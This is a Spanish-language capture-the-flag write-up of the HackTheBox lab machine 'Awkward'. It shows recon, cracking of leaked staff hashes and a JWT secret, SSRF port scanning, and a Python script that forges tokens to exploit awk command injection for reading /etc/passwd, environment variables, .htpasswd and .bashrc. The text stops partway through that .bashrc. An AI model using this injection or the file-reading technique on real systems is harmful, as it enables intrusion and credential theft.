---
layout: post
title: Awkward
date: 2023-03-23
description:
img:
fig-caption:
tags: [eWPT, OSCP (Intrusión), eJPT, eCPPTv2]
---
___

<center><img src="/writeups/assets/img/Awkward-htb/Awkward.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.11.185 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 11:35 GMT
Nmap scan report for 10.10.11.185
Host is up (0.082s latency).
Not shown: 65307 closed tcp ports (reset), 226 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.185 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 11:37 GMT
Nmap scan report for 10.10.11.185
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)
|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb```, analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.185
http://10.10.11.185 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.185], Meta-Refresh-Redirect[http://hat-valley.htb], nginx[1.18.0]
ERROR Opening: http://hat-valley.htb - no address for hat-valley.htb
```

Añado el dominio ```hat-valley.htb``` al ```/etc/hosts```

```null
whatweb http://10.10.11.185
http://10.10.11.185 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.185], Meta-Refresh-Redirect[http://hat-valley.htb], nginx[1.18.0]
http://hat-valley.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.185], JQuery[3.0.0], Script[text/javascript], Title[Hat Valley], X-Powered-By[Express], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/Awkward-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://hat-valley.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hat-valley.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/23 11:45:29 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 173] [--> /css/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/static               (Status: 301) [Size: 179] [--> /static/]
```

Encuentro un subdominio

```null
wfuzz -c -t 200 --hh=132 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.hat-valley.htb" http://hat-valley.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000081:   401        7 L      12 W       188 Ch      "store"                                                                                                                                         

Total time: 33.52812
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 148.8004
```

Necesito credenciales para acceder a él

<img src="/writeups/assets/img/Awkward-htb/2.png" alt="">

Veo el ```router.js``` desde el ```Chromium```

<img src="/writeups/assets/img/Awkward-htb/3.png" alt="">

```null
import { createWebHistory, createRouter } from "vue-router";
import { VueCookieNext } from 'vue-cookie-next'
import Base from '../Base.vue'
import HR from '../HR.vue'
import Dashboard from '../Dashboard.vue'
import Leave from '../Leave.vue'

const routes = [
  {
    path: "/",
    name: "base",
    component: Base,
  },
  {
    path: "/hr",
    name: "hr",
    component: HR,
  },
  {
    path: "/dashboard",
    name: "dashboard",
    component: Dashboard,
    meta: {
      requiresAuth: true
    }
  },
  {
    path: "/leave",
    name: "leave",
    component: Leave,
    meta: {
      requiresAuth: true
    }
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes,
});

router.beforeEach((to, from, next) => {
  if((to.name == 'leave' || to.name == 'dashboard') && VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login
    next({ name: 'hr' })
  }
  else if(to.name == 'hr' && VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard
    next({ name: 'dashboard' })
  }
  else {
    next()
  }
})

export default router;
```

En la ruta ```/hr``` hay un nuevo panel de autenticación

<img src="/writeups/assets/img/Awkward-htb/4.png" alt="">

La intercepto con ```BurpSuite```, y veo que la petición se está tramitando contra una API. En caso de no introducir todos los datos, se leakean rutas

```null
curl -s -X POST http://hat-valley.htb/api/login
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received undefined<br> &nbsp; &nbsp;at Function.from (buffer.js:330:9)<br> &nbsp; &nbsp;at new Buffer (buffer.js:286:17)<br> &nbsp; &nbsp;at module.exports (/var/www/hat-valley.htb/node_modules/sha256/lib/nodecrypto.js:14:12)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/server/server.js:30:76<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15<br> &nbsp; &nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)</pre>
</body>
</html>
```

Al igual que antes, inspecciono los archivos en JavaScript para descubrir rutas. En el ```leave.js```, aparece la de la API

```null
import axios from 'axios'
axios.defaults.withCredentials = true
const baseURL = "/api/"

const get_all = () => {
    return axios.get(baseURL + 'all-leave')
        .then(response => response.data)
}

const submit_leave = (reason, start, end) => {
    return axios.post(baseURL + 'submit-leave', {reason, start, end})
        .then(response => response.data)
}

export default {
    get_all,
    submit_leave
}
```

Pero le está concatenando la ruta ```submit-leave```. Al replicarla veo lo siguiente:

```null
curl -s -X POST http://hat-valley.htb/api/submit-leave; echo
Invalid user
```

Veo otro archivo, y encuentro ```/store-status```

```null
import axios from 'axios'
axios.defaults.withCredentials = true
const baseURL = "/api/"

const store_status = (URL) => {
    const params = {
        url: {toJSON: () => URL}
    }
    return axios.get(baseURL + 'store-status', {params})
        .then(response => response.data)
}

export default {
    store_status
}
```

Lo mismo para ```/staff-details```

```null
import axios from 'axios'
axios.defaults.withCredentials = true
const baseURL = "/api/"

const staff_details = () => {
    return axios.get(baseURL + 'staff-details')
        .then(response => response.data)
}

export default {
    staff_details
}
```

Pero en esta ocasión me aparecen usuarios con sus respectivos hashes

```null
curl -s -X GET http://hat-valley.htb/api/staff-details | jq
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]
```

```null
curl -s -X GET http://hat-valley.htb/api/staff-details | jq '.[] | "\(.username):\(.password)"' -r > hashes
```

Los crackeo con ```hashcat```.

```null
hashcat -m 1400 hashes /usr/share/wordlists/rockyou.txt --show
e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
```

Al cargar ```/staff-details```, se está setteando una cookie ```token=guest``` si lo hago desde el navegador

```null
GET /api/staff-details HTTP/1.1
Host: hat-valley.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=guest
Connection: close
```

Intento iniciar sesión. Recibo un JWT

```null
POST /api/login HTTP/1.1
Host: hat-valley.htb
Content-Length: 54
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://hat-valley.htb
Referer: http://hat-valley.htb/hr
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=guest
Connection: close

{"username":"christopher.jones","password":"chris123"}
```

```null
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 23 Mar 2023 16:58:31 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 180
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"b4-Mq3l8ocxeXXziBtzK2qucwBFFp0"

{"name":"Christopher","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc5NTkwNzExfQ.aopS9-01swwY-nTnRy6ncur6wZwgEPK3QnG4aDibq5s"}
```

Está compuesto por lo siguiente:

<img src="/writeups/assets/img/Awkward-htb/5.png" alt="">

La interfaz de ```/hr``` se ve así:

<img src="/writeups/assets/img/Awkward-htb/6.png" alt="">

Hay un SSRF en un openredirect

<img src="/writeups/assets/img/Awkward-htb/7.png" alt="">

```null
GET /api/store-status?url="http://127.0.0.1:80" HTTP/1.1
Host: hat-valley.htb
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Referer: http://hat-valley.htb/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc5NTkxMTM1fQ.lX7idsk2WrMUTxVUeMD0xHMR_DD05ldskrbEOMaQ8-I
Connection: close
```

```null
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 23 Mar 2023 17:07:32 GMT
Content-Type: text/html; charset=utf-8
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"84-P/5ob00JvOzx20G7pf2GChzepTg"
Content-Length: 132

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Refresh" content="0; url='http://hat-valley.htb'" />
</head>
<body>
</body>
</html>
```

Utilizo ```wfuzz``` para hacer un PortDiscovery

```null
wfuzz -c --hh=0 -t 200 -z range,1-65535 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000080:   200        8 L      13 W       132 Ch      "80"                                                                                                                                            
000003002:   200        685 L    5834 W     77002 Ch    "3002"                                                                                                                                          
000008080:   200        54 L     163 W      2881 Ch     "8080"                                                                                                                                          

Total time: 0
Processed Requests: 65535
Filtered Requests: 65532
Requests/sec.: 0
```

El 8080 contiene lo siguiente

```null
HTTP/1.1 200 OK

Server: nginx/1.18.0 (Ubuntu)

Date: Thu, 23 Mar 2023 17:13:24 GMT

Content-Type: text/html; charset=utf-8

Connection: close

x-powered-by: Express

access-control-allow-origin: *

etag: W/"b41-tn8t3x3qcvcm126OQ/i0AXwBj8M"

Content-Length: 2881



<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel = "stylesheet" href = "/css/main.css">
    <link rel="stylesheet" href="/css/bootstrap.min.css">
    <!-- style css -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- Responsive-->
    <link rel="stylesheet" href="/css/responsive.css">
    <!-- fevicon -->
    <link rel="icon" href="/static/blue.png" type="image/png" />
    <!-- Scrollbar Custom CSS -->
    <link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
    <!-- Tweaks for older IEs-->
    <link rel="stylesheet" href="/css/font-awesome.css">
    <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="screen">
    <link rel="stylesheet" href="/static/vendors/mdi/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/static/vendors/feather/feather.css">
    <link rel="stylesheet" href="/static/vendors/base/vendor.bundle.base.css">
    <link rel="stylesheet" href="/static/vendors/flag-icon-css/css/flag-icon.min.css">
    <link rel="stylesheet" href="/static/vendors/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/static/vendors/jquery-bar-rating/fontawesome-stars-o.css">
    <link rel="stylesheet" href="/static/vendors/jquery-bar-rating/fontawesome-stars.css">
    <link rel="stylesheet" href="/static/css/style.css">
    <title>Hat Valley</title>
  <link href="/js/app.js" rel="preload" as="script"><link href="/js/chunk-vendors.js" rel="preload" as="script"></head>
  <body>
    <noscript>
      <strong>We're sorry but hat-valley doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
    <script src="/js/jquery.min.js"></script>
    <script src="/js/popper.min.js"></script>
    <script src="/js/bootstrap.bundle.min.js"></script>
    <script src="/js/jquery-3.0.0.min.js"></script>
    <script src="/js/plugin.js"></script>
    <!-- sidebar -->
    <script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
    <script src="/js/custom.js"></script>
    <script src="/js/jquery.fancybox.min.js"></script>

    <script src="/static/vendors/base/vendor.bundle.base.js"></script>
    <script src="/static/js/off-canvas.js"></script>
    <script src="/static/js/hoverable-collapse.js"></script>
    <script src="/static/js/template.js"></script>
    <script src="/static/vendors/chart.js/Chart.min.js"></script>
    <script src="/static/vendors/jquery-bar-rating/jquery.barrating.min.js"></script>
    <script src="/static/js/dashboard.js"></script>
  <script type="text/javascript" src="/js/chunk-vendors.js"></script><script type="text/javascript" src="/js/app.js"></script></body>
</html>
```


Este campo también es vulnerable a RFI

```null
GET /api/store-status?url="http://10.10.16.5/" HTTP/1.1
```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.185 - - [23/Mar/2023 17:19:09] "GET / HTTP/1.1" 200 -
```

Pero al no interpretar PHP es complicado poder derivarlo a RCE. En el puerto 3002 hay un panel de ayuda de la API

<img src="/writeups/assets/img/Awkward-htb/8.png" alt="">

Inspecciono el código de ```/submit-leave```

```null
app.post('/api/submit-leave', (req, res) => {
  const {reason, start, end} = req.body
  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));
  const badInReason = bad.some(char => reason.includes(char));
  const badInStart = bad.some(char => start.includes(char));
  const badInEnd = bad.some(char => end.includes(char));

  if(badInUser || badInReason || badInStart || badInEnd) {
    return res.status(500).send("Bad character detected.")
  }

  const finalEntry = user + "," + reason + "," + start + "," + end + ",Pending\r"

  exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send("Failed to add leave request")
    }
    return res.status(200).send("Successfully added new leave request")
  })
})
```

Y el de ```/all-leave```

```null
app.get('/api/all-leave', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));

  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }

  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }
    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})
```

Se está ejecutando el comando ```awk```, y el campo del usuario que le está concatenando, puedo controlarlo como input, por lo que es posible una inyección que me permita obtener un LFI. El único inconveniente, es que hay una lista de badchars que no puedo introducir. Además, para poder modificar el JWT, necesito obtener el secreto

Es posible llegar a crackearlo utilizando ```hashcat```

```null
hashcat hash /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

16500 | JWT (JSON Web Token) | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc5NTkwNzExfQ.aopS9-01swwY-nTnRy6ncur6wZwgEPK3QnG4aDibq5s:123beany123
```

Creo un script en python que me permita generar automáticamente el JWT para leer archivos de la máquina

```null
#!/usr/bin/python3

import requests, jwt, sys

secret = "123beany123"
username = {"username": f"/' {sys.argv[1]} '/test"}
token = jwt.encode(username, secret)

main_url = "http://hat-valley.htb/api/all-leave"
cookies = {
    "token": "%s" % token
}

r = requests.get(main_url, cookies=cookies)
print(r.text)
```

```null
python3 lfi.py /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
```

Desde el ```/proc/self/environ``` puedo ver que el usuario que está ejecutando el servicio web es ```www-data```

```null
python3 lfi.py /proc/self/environ
pm_out_log_path=/var/www/.pm2/logs/server-out.logSUDO_GID=0MAIL=/var/mail/www-dataLANGUAGE=en_AU:enUSER=www-datarestart_time=0PM2_USAGE=CLIusername=www-dataHOME=/var/wwwPM2_HOME=/var/www/.pm2created_at=1679571106074pm_cwd=/var/www/hat-valley.htbnamespace=defaultfilter_env=pm_exec_path=/var/www/hat-valley.htb/serverkill_retry_time=100pm_id=1unstable_restarts=0SUDO_UID=0node_args=LOGNAME=www-dataexec_mode=fork_modeTERM=unknownwindowsHide=trueNODE_APP_INSTANCE=0axm_monitor=[object Object]status=launchingPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binwatch=falseexec_interpreter=nodeaxm_options=[object Object]axm_dynamic=[object Object]vizion=truepm_err_log_path=/var/www/.pm2/logs/server-error.logpm_pid_path=/var/www/.pm2/pids/server-1.pidLANG=en_AU.UTF-8treekill=trueSUDO_COMMAND=/usr/local/bin/pm2 start serverpmx=trueSHELL=/usr/sbin/nologinunique_id=2084dfd2-1303-482d-8f1f-88a1f1613741automation=trueSUDO_USER=rootvizion_running=falseinstance_var=NODE_APP_INSTANCEname=serverPWD=/var/www/hat-valley.htbenv=[object Object]merge_logs=trueinstances=1km_link=falseaxm_actions=autorestart=truepm_uptime=1679571106074
```

Listo los paquetes de ```node.js``` que están instalados

```null
python3 lfi.py /var/www/hat-valley.htb/package.json | jq
{
  "name": "hat-valley",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "serve": "./node_modules/@vue/cli-service/bin/vue-cli-service.js serve",
    "build": "vue-cli-service build",
    "lint": "vue-cli-service lint",
    "server": "nodemon server/server.js"
  },
  "dependencies": {
    "@fortawesome/fontawesome-free": "^6.2.0",
    "axios": "^0.27.2",
    "child_process": "^1.0.2",
    "cookie-parser": "^1.4.6",
    "cors": "^2.8.5",
    "express": "^4.18.1",
    "jsonwebtoken": "^8.5.1",
    "mysql": "^2.18.1",
    "nodemon": "^2.0.19",
    "path": "^0.12.7",
    "sha256": "^0.2.0",
    "vue": "^3.2.39",
    "vue-cookie-next": "^1.3.0",
    "vue-router": "^4.1.5",
    "vuex": "^4.0.2"
  },
  "devDependencies": {
    "@vue/cli-plugin-babel": "~4.5.0",
    "@vue/cli-plugin-eslint": "~4.5.0",
    "@vue/cli-service": "~4.5.0",
    "@vue/compiler-sfc": "^3.0.0",
    "babel-eslint": "^10.1.0",
    "eslint": "^6.7.2",
    "eslint-plugin-vue": "^7.0.0"
  },
  "eslintConfig": {
    "root": true,
    "env": {
      "node": true
    },
    "extends": [
      "plugin:vue/vue3-essential",
      "eslint:recommended"
    ],
    "parserOptions": {
      "parser": "babel-eslint"
    },
    "rules": {
      "no-unused-vars": "off"
    }
  },
  "browserslist": [
    "> 1%",
    "last 2 versions",
    "not dead"
  ]
}
```

Y traigo el archivo que monta el servidor, ```server.js```

```null
python3 lfi.py /var/www/hat-valley.htb/server/server.js
const express = require('express')
const bodyParser = require('body-parser')
const cors = require('cors')
const jwt = require('jsonwebtoken')
const app = express()
const axios = require('axios')
const { exec } = require("child_process");
const path = require('path')
const sha256 = require('sha256')
const cookieParser = require("cookie-parser")
app.use(bodyParser.json())
app.use(cors())
app.use(cookieParser())
const mysql = require('mysql')
const { response } = require('express')
const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'SQLDatabasePassword321!',
  database: 'hatvalley',
  stringifyObjects: true
})
const port = 3002

const TOKEN_SECRET = "123beany123"

app.post('/api/login', (req, res) => {
  const {username, password} = req.body
  connection.query(
    'SELECT * FROM users WHERE username = ? AND password = ?', [ username, sha256(password) ],
    function (err, results) {
      if(err) {
        return res.status(401).send("Incorrect username or password")
      }
      else {
        if(results.length !== 0) {
          const userForToken = {
            username: results[0].username
          }
          const firstName = username.split(".")[0][0].toUpperCase() + username.split(".")[0].slice(1).toLowerCase()
          const token = jwt.sign(userForToken, TOKEN_SECRET)
          const toReturn = {
            "name": firstName,
            "token": token
          }
          return res.status(200).json(toReturn)
        }
        else {
          return res.status(401).send("Incorrect username or password")
        }
      }
    }
  );
})

app.post('/api/submit-leave', (req, res) => {
  const {reason, start, end} = req.body
  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"] //https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

  const badInUser = bad.some(char => user.includes(char));
  const badInReason = bad.some(char => reason.includes(char));
  const badInStart = bad.some(char => start.includes(char));
  const badInEnd = bad.some(char => end.includes(char));

  if(badInUser || badInReason || badInStart || badInEnd) {
    return res.status(500).send("Bad character detected.")
  }

  const finalEntry = user + "," + reason + "," + start + "," + end + ",Pending\r"

  exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send("Failed to add leave request")
    }
    return res.status(200).send("Successfully added new leave request")
  })
})

app.get('/api/all-leave', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"] //https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

  const badInUser = bad.some(char => user.includes(char));

  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }

  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }
    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})

app.get('/api/store-status', async (req, res) => {
  await axios.get(req.query.url.substring(1, req.query.url.length-1))
    .then(http_res => {
      return res.status(200).send(http_res.data)
    })
    .catch(http_err => {
      return res.status(200).send(http_err.data)
    })
})

app.get('/api/staff-details', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  connection.query(
    'SELECT * FROM users', 
    function (err, results) {
      if(err) {
        return res.status(500).send("Database error")
      }
      else {
        return res.status(200).json(results)
      }
    }
  );
})

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname+'/readme.html'))
})

app.listen(port, 'localhost', () => {
  console.log(`Server listening on port ${port}`)
  connection.connect()
})
```

Se pueden ver credenciales de acceso a la base de datos, ```root:SQLDatabasePassword321!```. No se reutilizan así que de momento no me sirven de nada

Ahora traigo el archivo de configuración de almacenamiento de ```nginx```

```null
python3 lfi.py /etc/nginx/sites-available/store.conf  | sed 's/^\s*//' | sed '/^#/d' | grep .
server {
listen       80;
server_name  store.hat-valley.htb;
root /var/www/store;
location / {
index index.php index.html index.htm;
}
location ~ /cart/.*\.php$ {
return 403;
}
location ~ /product-details/.*\.php$ {
return 403;
}
location ~ \.php$ {
auth_basic "Restricted";
auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
fastcgi_index  index.php;
fastcgi_param  SCRIPT_FILENAME  $realpath_root$fastcgi_script_name;
include        fastcgi_params;
}
}
```

Y veo el ```htpasswd```. Contiene un hash

```null
python3 lfi.py /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

En la ```bashrc``` del usuario ```bean``` está creado un alias que referencia a un documento

```null
python3 lfi.py /home/bean/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

